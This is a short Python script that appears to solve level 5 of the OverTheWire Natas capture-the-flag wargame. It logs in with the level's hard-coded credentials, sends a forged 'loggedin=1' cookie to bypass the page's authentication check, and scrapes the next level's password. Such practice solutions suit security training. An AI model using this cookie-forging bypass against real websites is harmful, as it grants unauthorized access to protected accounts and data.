import requests
from bs4 import BeautifulSoup

url = "http://natas5.natas.labs.overthewire.org/"
r = requests.get(url, auth=('natas5','iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq'), cookies={'loggedin':'1'})
soup=BeautifulSoup(r.text, 'html.parser')
tag = soup.find('div', attrs={'id':'content'})
password = tag.text.strip()[16:75]
print(password)
